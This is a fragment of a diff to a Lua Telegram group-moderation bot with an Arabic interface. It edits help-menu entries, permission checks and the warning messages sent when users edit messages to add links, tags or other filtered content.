 • اذاعه + كليشه | 🛃
 • تنظيف + عدد | 🚮
+• اضف مطور | ⏫
+• حذف مطور |⏬
+• تغير امر المطور |🗳
+• اضف رد للكل |📨
+• حذف رد للكل | 📤
 ֆ • • • • • • • • • • • • • ֆ
 ]]
                 send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
@@ -8568,7 +8573,7 @@ if text:match("^source$") or text:match("^اصدار$") or text:match("^الاص
 • <code>رابط Github cli </code>🔰:-
 • https://github.com/moodlIMyIl/TshAkE
 
-•<code> رابط Github api </code>🔱:-
+•<code> رابط Github api </code>:-
 • https://github.com/moodlIMyIl/TshAkEapi
 ]]
                 send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
@@ -8601,7 +8606,7 @@ if text:match("^اريد رابط حذف$") or text:match("^رابط حذف$") o
 	if result.id_ and result.content_.text_ then
 	database:set('bot:editid'..result.id_,result.content_.text_)
 	end
-  if not is_mod(result.sender_user_id_, result.chat_id_) then
+  if not is_vip(result.sender_user_id_, result.chat_id_) then
    check_filter_words(result, text)
    if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or
 text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") then
@@ -8615,11 +8620,15 @@ text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") then
    if database:get('bot:links:warn'..result.chat_id_) then
     local msgs = {[0] = data.message_id_}
        delete_msg(msg.chat_id_,msgs)
-                            send(msg.chat_id_, 0, 1, "● - <code>ممنوع عمل تعديل للروابط</code> ⚠️", 1, 'html')
+                            send(msg.chat_id_, 0, 1, "• <code>ممنوع عمل تعديل للروابط</code> ⚠️", 1, 'html')
 	end
 end
 end
 
+	if result.id_ and result.content_.text_ then
+	database:set('bot:editid'..result.id_,result.content_.text_)
+  if not is_vip(result.sender_user_id_, result.chat_id_) then
+   check_filter_words(result, text)
    	if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") then
    if database:get('bot:webpage:mute'..result.chat_id_) then
     local msgs = {[0] = data.message_id_}
@@ -8629,10 +8638,16 @@ end
    if database:get('bot:webpage:warn'..result.chat_id_) then
     local msgs = {[0] = data.message_id_}
        delete_msg(msg.chat_id_,msgs)
-                            send(msg.chat_id_, 0, 1, "● - <code>ممنوع عمل تعديل للمواقع</code> ⚠️", 1, 'html')
+                            send(msg.chat_id_, 0, 1, "• <code>ممنوع عمل تعديل للمواقع</code> ⚠️", 1, 'html')
 	end
 end
 end
+end
+end
+	if result.id_ and result.content_.text_ then
+	database:set('bot:editid'..result.id_,result.content_.text_)
+  if not is_vip(result.sender_user_id_, result.chat_id_) then
+   check_filter_words(result, text)
    if text:match("@") then
    if database:get('bot:tag:mute'..result.chat_id_) then
     local msgs = {[0] = data.message_id_}
@@ -8641,8 +8656,14 @@ end
 	   if database:get('bot:tag:warn'..result.chat_id_) then
     local msgs = {[0] = data.message_id_}
        delete_msg(msg.chat_id_,msgs)
-                            send(msg.chat_id_, 0, 1, "● - <code>ممنوع عمل تعديل للمعرفات</code> ⚠️", 1, 'html')
+                            send(msg.chat_id_, 0, 1, "• <code>ممنوع عمل تعديل للمعرفات</code> ⚠️", 1, 'html')
 	end
+end
+end
+	if result.id_ and result.content_.text_ then
+	database:set('bot:editid'..result.id_,result.content_.text_)
+  if not is_vip(result.sender_user_id_, result.chat_id_) then
+   check_filter_words(result, text)
    	if text:match("#") then
    if database:get('bot:hashtag:mute'..result.chat_id_) then
     local msgs = {[0] = data.message_id_}
@@ -8651,10 +8672,15 @@ end
 	   if database:get('bot:hashtag:warn'..result.chat_id_) then
     local msgs = {[0] = data.message_id_}
        delete_msg(msg.chat_id_,msgs)
-                            send(msg.chat_id_, 0, 1, "● - <code>ممنوع عمل تعديل للتاكات</code> ⚠️", 1, 'html')
-
+                            send(msg.chat_id_, 0, 1, "• <code>ممنوع عمل تعديل للتاكات</code> ⚠️", 1, 'html')
 	end
-   	if text:match("/") then
+end
+end
+	if result.id_ and result.content_.text_ then
+	database:set('bot:editid'..result.id_,result.content_.text_)
+  if not is_vip(result.sender_user_id_, result.chat_id_) then
+   check_filter_words(result, text)
+   	if text:match("/")  then
    if database:get('bot:cmd:mute'..result.chat_id_) then
     local msgs = {[0] = data.message_id_}
        delete_msg(msg.chat_id_,msgs)
@@ -8662,9 +8688,15 @@ end
 	   if database:get('bot:cmd:warn'..result.chat_id_) then
     local msgs = {[0] = data.message_id_}
        delete_msg(msg.chat_id_,msgs)
-                            send(msg.chat_id_, 0, 1, "● - <code>ممنوع عمل تعديل للشارحه</code> ⚠️", 1, 'html')
+                            send(msg.chat_id_, 0, 1, "• <code>ممنوع عمل تعديل للشارحه</code> ⚠️", 1, 'html')
 	end
 end
+end
+end
+	if result.id_ and result.content_.text_ then
+	database:set('bot:editid'..result.id_,result.content_.text_)
+  if not is_vip(result.sender_user_id_, result.chat_id_) then
+   check_filter_words(result, text)
    	if text:match("[\216-\219][\128-\191]") then
    if database:get('bot:arabic:mute'..result.chat_id_) then
     local msgs = {[0] = data.message_id_}
@@ -8674,9 +8706,15 @@ end
 	   if database:get('bot:arabic:warn'..result.chat_id_) then
     local msgs = {[0] = data.message_id_}
        delete_msg(msg.chat_id_,msgs)
-                            send(msg.chat_id_, 0, 1, "● - <code>ممنوع عمل تعديل  للغه العربيه</code> ⚠️", 1, 'html')
+                            send(msg.chat_id_, 0, 1, "• <code>ممنوع عمل تعديل  للغه العربيه</code> ⚠️", 1, 'html')
 	end
-   end
+ end
+end
+end
+	if result.id_ and result.content_.text_ then
+	database:set('bot:editid'..result.id_,result.content_.text_)
+  if not is_vip(result.sender_user_id_, result.chat_id_) then
+   check_filter_words(result, text)
    if text:match("[ASDFGHJKLQWERTYUIOPZXCVBNMasdfghjklqwertyuiopzxcvbnm]") then
    if database:get('bot:english:mute'..result.chat_id_) then
     local msgs = {[0] = data.message_id_}
@@ -8685,31 +8723,42 @@ end
 	   if database:get('bot:english:warn'..result.chat_id_) then
     local msgs = {[0] = data.message_id_}
        delete_msg(msg.chat_id_,msgs)
-                            send(msg.chat_id_, 0, 1, "● - <code>ممنوع عمل تعديل  للغه الانكليزيه</code> ⚠️", 1, 'html')
+                            send(msg.chat_id_, 0, 1, "• <code>ممنوع عمل تعديل  للغه الانكليزيه</code> ⚠️", 1, 'html')
+end
+end
 end
 end
     end
 	end
+  	function get_msg_contact(extra, result, success)
+	local text = (result.content_.text_ or result.content_.caption_)
+    --vardump(result)
+	if result.id_ and result.content_.text_ then
+	database:set('bot:editid'..result.id_,result.content_.text_)
+  if not is_vip(result.sender_user_id_, result.chat_id_) then
+   check_filter_words(result, text)
 	if database:get('editmsg'..msg.chat_id_) == 'delmsg' then
         local id = msg.message_id_
         local msgs = {[0] = id}
         local chat = msg.chat_id_
               delete_msg(chat,msgs)
-              send(msg.chat_id_, 0, 1, "● - <code>ممنوع التعديل هنا</code> ⚠️", 1, 'html')
+              send(msg.chat_id_, 0, 1, "• <code>ممنوع التعديل هنا</code> ⚠️", 1, 'html')
 	elseif database:get('editmsg'..msg.chat_id_) == 'didam' then
 	if database:get('bot:editid'..msg.message_id_) then
 		local old_text = database:get('bot:editid'..msg.message_id_)
-     send(msg.chat_id_, msg.message_id_, 1, '● - `لقد قمت بالتعديل` ❌\n\n● -`رسالتك السابقه ` ⬇️  : \n\n● - [ '..old_text..' ]', 1, 'md')
+     send(msg.chat_id_, msg.message_id_, 1, '• `لقد قمت بالتعديل` ❌\n\n•`رسالتك السابقه ` ⬇️  : \n\n• [ '..old_text..' ]', 1, 'md')
 	end
 end 
-
+end
+end
+end
     getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
   -----------------------------------------------------------------------------------------------
   elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
     tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)    
   end
   -----------------------------------------------------------------------------------------------
-end 
+end
 
 --[[                                    Dev @lIMyIl         
    _____    _        _    _    _____    Dev @EMADOFFICAL 
